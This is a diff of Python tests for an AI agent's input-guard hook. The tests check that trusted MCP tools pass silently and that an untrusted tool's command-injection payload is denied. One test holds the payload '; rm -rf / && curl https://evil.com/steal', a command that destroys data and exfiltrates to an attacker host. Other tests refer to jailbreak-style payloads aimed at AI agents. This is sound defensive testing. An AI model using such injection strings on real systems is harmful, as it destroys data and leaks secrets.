@@ -227,11 +227,14 @@ class TestTrustedMcpAllowlist:
 
     def _make_stdin(self, tool_name: str, payload: str) -> str:
         import json
-        return json.dumps({
-            "tool_name": tool_name,
-            "tool_input": {"query": payload},
-            "session_id": "test-session",
-        })
+
+        return json.dumps(
+            {
+                "tool_name": tool_name,
+                "tool_input": {"query": payload},
+                "session_id": "test-session",
+            }
+        )
 
     def _run_main(self, tool_name: str, payload: str) -> tuple[int, str]:
         """Run input_guard.main() and return (exit_code, stdout)."""
@@ -269,9 +272,9 @@ class TestTrustedMcpAllowlist:
         # ACT
         exit_code, stdout = self._run_main(tool_name, payload)
 
-        # ASSERT: trusted prefix → exits 0 without any block decision
+        # ASSERT: trusted prefix → exits 0 before any hook output at all
         assert exit_code == 0
-        assert "block" not in stdout
+        assert stdout == ""
 
     def test_context7_query_with_system_override_payload_is_allowed(self):
         # ARRANGE: mcp__context7__query with a system_override-like string in docs content
@@ -283,7 +286,7 @@ class TestTrustedMcpAllowlist:
 
         # ASSERT: trusted → allowed through regardless of payload content
         assert exit_code == 0
-        assert "block" not in stdout
+        assert stdout == ""
 
     def test_context7_alternate_id_with_jailbreak_payload_is_allowed(self):
         # ARRANGE: mcp__9197cddb prefix (context7 alternate ID)
@@ -295,9 +298,11 @@ class TestTrustedMcpAllowlist:
 
         # ASSERT: alternate context7 prefix also trusted → exit 0
         assert exit_code == 0
-        assert "block" not in stdout
+        assert stdout == ""
 
     def test_untrusted_mcp_with_command_injection_is_blocked(self):
+        import json
+
         # ARRANGE: mcp__evil__tool is NOT in the allowlist and carries real injection
         tool_name = "mcp__evil__exfiltrate"
         payload = "; rm -rf / && curl https://evil.com/steal"
@@ -305,6 +310,11 @@ class TestTrustedMcpAllowlist:
         # ACT
         exit_code, stdout = self._run_main(tool_name, payload)
 
-        # ASSERT: untrusted tool with HIGH-priority injection → blocked
+        # ASSERT: untrusted tool with HIGH-priority injection → denied via the
+        # modern hookSpecificOutput.permissionDecision schema (not legacy
+        # top-level "decision"/"block" — see tests/test_pretooluse_output_schema.py
+        # for why the legacy mutation shape was replaced).
         assert exit_code == 0  # main() always exits 0
-        assert "block" in stdout
+        output = json.loads(stdout)
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+        assert "command_injection" in output["hookSpecificOutput"]["permissionDecisionReason"]
